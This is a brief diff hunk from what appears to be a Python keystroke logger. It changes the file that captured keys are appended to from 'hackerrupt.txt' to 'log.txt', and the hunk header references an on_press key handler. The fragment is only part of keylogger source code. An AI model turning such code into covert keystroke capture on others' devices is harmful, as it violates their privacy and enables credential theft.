@@ -23,7 +23,7 @@ def on_press(key):
         keys.append(key)
 
 def write_log(keys):
-    with open("hackerrupt.txt", "a") as f:
+    with open("log.txt", "a") as f:
         words = []
         for key in keys:
             if str(key).startswith("Key"):
